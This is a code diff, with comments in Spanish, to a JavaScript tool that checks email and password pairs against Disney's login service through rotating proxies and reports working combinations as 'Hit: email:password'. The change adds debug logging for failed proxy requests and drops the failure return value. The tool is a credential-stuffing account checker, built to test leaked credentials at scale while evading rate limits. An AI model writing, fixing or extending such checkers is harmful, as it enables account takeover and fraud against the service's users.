@@ -24,7 +24,11 @@ const makeRequestWithProxy = async (url, headers, data, proxy) => {
     });
     return response.data;
   } catch (error) {
+    // Imprimir más información para depurar
     console.error(`Error con proxy ${proxy}:`, error.message);
+    if (error.response) {
+      console.error("Response error data:", error.response.data);
+    }
     return null; // Retorna null si la solicitud falla con este proxy
   }
 };
@@ -52,6 +56,8 @@ const verifyDisneyCredentials = async (email, password) => {
     if (deviceResponse && deviceResponse.assertion) {
       assertion = deviceResponse.assertion;
       break;
+    } else {
+      console.error("No se pudo obtener assertion con el proxy:", proxy);
     }
   }
 
@@ -70,6 +76,8 @@ const verifyDisneyCredentials = async (email, password) => {
     if (tokenResponse && tokenResponse.access_token) {
       accessToken = tokenResponse.access_token;
       break;
+    } else {
+      console.error("No se pudo obtener access token con el proxy:", proxy);
     }
   }
 
@@ -88,7 +96,7 @@ const verifyDisneyCredentials = async (email, password) => {
     if (loginResponse && loginResponse.id_token) {
       return `Hit: ${email}:${password}`;
     } else {
-      return `Bad Account para ${email}`;
+      console.error("Credenciales no válidas o error en login con el proxy:", proxy);
     }
   }
 
